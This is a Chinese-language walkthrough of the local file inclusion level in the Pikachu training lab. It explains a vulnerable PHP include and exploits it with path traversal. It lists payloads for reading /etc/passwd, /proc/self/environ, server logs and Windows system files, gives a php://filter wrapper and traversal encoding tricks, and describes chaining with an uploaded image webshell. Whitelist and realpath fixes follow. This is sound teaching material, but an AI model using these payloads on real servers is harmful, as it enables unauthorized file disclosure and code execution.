# 文件包含(local) 通关笔记

> 下拉框只能选 5 个球员页面——**但参数是我们自己发的。**
>
> 把 `filename` 改成路径穿越，就能包含服务器上的任意文件。

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | File Inclusion → File Inclusion(local) |
| 页面地址 | `http://pikachu/vul/fileinclude/fi_local.php` |
| 提交方式 | GET |
| 参数名 | `filename` |
| 目标 | 包含服务器上的任意文件 |

页面是一个下拉框：

```
[Kobe bryant / Allen Iverson / Kevin Durant / Tracy McGrady / Ray Allen]
```

---

## 二、我的解题步骤

### 步骤 1：先正常选一个

选「Kobe bryant」，页面显示科比的信息。

看地址栏：

```
fi_local.php?filename=file1.php&submit=
```

**参数就是文件名。**

### 步骤 2：看源码

```php
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
//     //安全的写法,使用白名单，严格指定包含的文件名
//     if($filename=='file1.php' || $filename=='file2.php' || ...){
//         include "include/$filename";
//     }
}
```

两个关键：

1. **`include "include/$filename"`** —— 直接拼接，没有过滤
2. **作者把白名单写法注释掉了** —— 让你看"正确做法长什么样"

### 步骤 3：路径穿越

`include` 的前缀是 `include/`，所以要往上跳。

路径关系：

```
D:\Pikachu\vul\fileinclude\include\   ← 前缀目录
D:\Pikachu\vul\fileinclude\           ← 上一层
D:\Pikachu\vul\                       ← 上两层
D:\Pikachu\                           ← 上三层
```

所以 payload 是：

```
../../../README.md
```

完整路径：

```
D:\Pikachu\vul\fileinclude\include\..\..\..\README.md
= D:\Pikachu\README.md
```

### 步骤 4：结果

访问：

```
fi_local.php?filename=../../../README.md&submit=
```

**页面把 README.md 的内容整篇渲染出来了。**

我实测：

| payload | 结果 |
| --- | --- |
| `file1.php` | 正常的球员页面 |
| `../../../README.md` | **README 全文**（约 35KB） |
| `../../../phpstudyV8使用说明.txt` | 说明文档全文 |
| `../../../LICENSE` | LICENSE 全文 |

## 三、原理分析

### 3.1 源码

```php
$html='';
if(isset($_GET['submit']) && $_GET['filename']!=null){
    $filename=$_GET['filename'];
    include "include/$filename";//变量传进来直接包含,没做任何的安全限制
}
```

### 3.2 为什么能跳出目录

`include` 接受的是**文件系统路径**，而 `../` 在路径解析里是"上一级"。

```
include/../../../README.md
        ↑↑↑
        跳三层
```

**`include` 没有任何"必须在 include 目录下"的检查。**

### 3.3 包含 PHP 文件会怎样

如果包含 `../../../inc/config.inc.php`：

```php
// config.inc.php 的内容
define('DBHOST', '127.0.0.1');
define('DBPW', 'rootroot');
...
```

**它会被"执行"，而不是"显示"。**

结果是：

- 常量被定义（如果之前没定义）
- 页面上**看不到任何内容**（因为 PHP 代码不输出）

**所以包含 PHP 文件时，页面反而是空的——这不代表失败。**

### 3.4 怎么读 PHP 源码

如果想知道 `config.inc.php` 的内容，需要 `php://filter`：

```
php://filter/read=convert.base64-encode/resource=../../inc/config.inc.php
```

但这一关有前缀 `include/`，**wrapper 必须写在最前面，所以这条路被堵住了**。

**能读文字文件（.txt/.md），但读不了 PHP 源码。**

### 3.5 更进一步的利用

如果能包含**自己上传的图片马**，就能 RCE：

```
fi_local.php?filename=../unsafeupload/uploads/xxx.jpg
```

前提是图片里有 `<?php ... ?>`，而且 `include` 会执行它。

**这就是"文件上传 + 文件包含"的组合拳。**

## 四、知识点与笔记

### 4.1 路径穿越的层数怎么算

先确定**当前文件所在目录**，再数要跳几层。

```
include "include/$filename"
```

`$filename` 是相对**当前脚本目录**（`fileinclude/`）解析的，再加上 `include/` 前缀。

所以真实路径是：

```
fileinclude/include/ + $filename
```

要到 `D:\Pikachu\`，需要跳 3 层：`../../../`

### 4.2 常用 payload

| 目标（Linux） | payload |
| --- | --- |
| 系统用户 | `../../../../etc/passwd` |
| 进程环境 | `../../../../proc/self/environ` |
| 网站配置 | `../../config.php` |
| 日志 | `../../../../var/log/apache2/access.log` |

| 目标（Windows） | payload |
| --- | --- |
| 系统配置 | `..\..\..\..\windows\win.ini` |
| 主机文件 | `..\..\..\..\windows\system32\drivers\etc\hosts` |

**Pikachu 在 D: 盘，所以用 `../../../` 就能到站点根目录。**

### 4.3 包含成功与否怎么判断

| 现象 | 说明 |
| --- | --- |
| 页面出现文件内容 | 成功（文本文件） |
| 页面空白，但没报错 | 可能是 PHP 文件被执行了 |
| 出现 `include(): Failed opening` | 路径不对 |

### 4.4 为什么"白名单"是唯一正解

因为路径穿越的变体太多了：

```
../
..\/
....//
%2e%2e%2f
..%252f
```

**你永远不知道攻击者会用哪种写法。**

而白名单是"只允许这几个值"，**不管你怎么编码，不在名单里就拒绝**。

## 五、和远程包含的区别

| | 本地包含(LFI) | 远程包含(RFI) |
| --- | --- | --- |
| 包含哪的文件 | **服务器本机** | 远程服务器 |
| 需要配置吗 | 不需要 | `allow_url_include=On` |
| 能直接 RCE 吗 | 需要配合（上传/日志） | **可以直接包含 shell** |
| 常见程度 | 更常见 | 较少（默认关闭） |

## 六、防御怎么写

### 6.1 白名单（源码里已经给了）

```php
$allow = ['file1.php', 'file2.php', 'file3.php', 'file4.php', 'file5.php'];

if (!in_array($filename, $allow, true)) {
    exit('非法文件');
}
include "include/" . $filename;
```

### 6.2 更好：映射表

```php
$map = [
    '1' => 'file1.php',
    '2' => 'file2.php',
    '3' => 'file3.php',
];

$page = $map[$_GET['p'] ?? ''] ?? 'file1.php';
include "include/" . $page;
```

**用户只能传 `1` `2` `3`，连文件名都接触不到。**

### 6.3 限制目录

```php
$base = realpath('include');
$target = realpath($base . '/' . $filename);

if (strpos($target, $base) !== 0) {
    exit('非法路径');
}
```

**`realpath` 会把 `../` 解析掉，再判断是否在允许目录内。**

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 路径穿越导致任意文件包含 |
| payload | `../../../README.md` |
| 实测 | 页面输出 README 全文 |
| 关键代码 | `include "include/$filename"` |
| 修复 | 白名单 / 映射表 / `realpath` |

**一句话**：

> **`include` 后面的路径一旦可控，`../` 就是通往整台服务器的楼梯。**
